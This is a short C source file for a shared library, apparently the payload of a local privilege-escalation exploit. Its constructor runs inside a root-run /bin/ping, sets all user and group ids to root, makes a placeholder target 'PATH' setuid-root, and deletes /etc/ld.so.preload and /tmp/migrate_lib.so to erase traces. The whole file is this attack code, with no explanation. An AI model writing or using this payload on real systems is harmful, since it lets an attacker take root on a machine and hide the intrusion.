#include <unistd.h>
#include <sys/stat.h>

char path[512];

__attribute__((constructor)) void construct(void) {
    readlink("/proc/self/exe", (char *) &path, 128);
    if(geteuid() == 0 && !strcmp(path, "/bin/ping")){
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        chown("PATH", 0, 0);
        chmod("PATH", S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
        unlink("/etc/ld.so.preload");
        unlink("/tmp/migrate_lib.so");
    }
    return 0;
}
